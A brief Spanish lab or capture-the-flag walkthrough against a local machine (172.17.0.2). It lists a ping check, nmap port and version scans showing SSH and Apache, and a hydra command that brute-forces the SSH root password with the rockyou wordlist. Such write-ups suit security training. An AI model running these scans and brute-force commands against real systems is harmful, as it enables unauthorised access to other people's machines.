1. Comprobar Conexión

ping 172.17.0.2

2. Escaneo de Puertos Abiertos

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

✅ Puertos abiertos: 22 (SSH) y 80 (HTTP)

3. Detección de Versiones de Servicios

nmap -p22,80 -sCV 172.17.0.2

Resultados:

    22/tcp open ssh → OpenSSH 9.6p1 Ubuntu 3ubuntu13.4
    80/tcp open http → Apache httpd 2.4.58 ((Ubuntu))

  
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
